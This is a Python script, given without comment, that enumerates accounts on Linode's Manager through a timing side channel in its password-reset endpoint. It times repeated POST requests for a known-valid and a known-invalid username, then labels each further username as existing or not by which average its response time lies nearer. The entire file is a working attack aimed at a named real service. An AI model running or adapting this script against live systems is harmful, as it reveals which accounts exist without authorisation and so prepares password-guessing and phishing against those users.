import statistics
import requests
import sys

def main():
    valid = sys.argv[1]
    invalid = sys.argv[2]

    valid_samples = []
    invalid_samples = []

    iterations = 25

    for x in [(valid_samples, valid), (invalid_samples, invalid)]:
        print('checking')
        for i in range(0, iterations):
            print(str(i) + ' / ' + str(iterations))
            r = requests.post('https://manager.linode.com/session/forgot_save/password', data={
                'username': x[1],
            })
            x[0].append(r.elapsed.total_seconds())

    mean_valid = statistics.mean(valid_samples)
    mean_invalid = statistics.mean(invalid_samples)

    print('mean valid: ' + str(mean_valid))
    print('mean invalid: ' + str(mean_invalid))

    for uname in sys.argv[3:]:
        r = requests.post('https://manager.linode.com/session/forgot_save/password', data={
            'username': uname,
        })
        # https://stackoverflow.com/a/12141215
        print(uname + ': ' + str((lambda num,collection:min(collection,key=lambda x:abs(x-num)))(r.elapsed.total_seconds(), [mean_valid, mean_invalid]) == mean_valid))

if __name__ == "__main__":
    main()
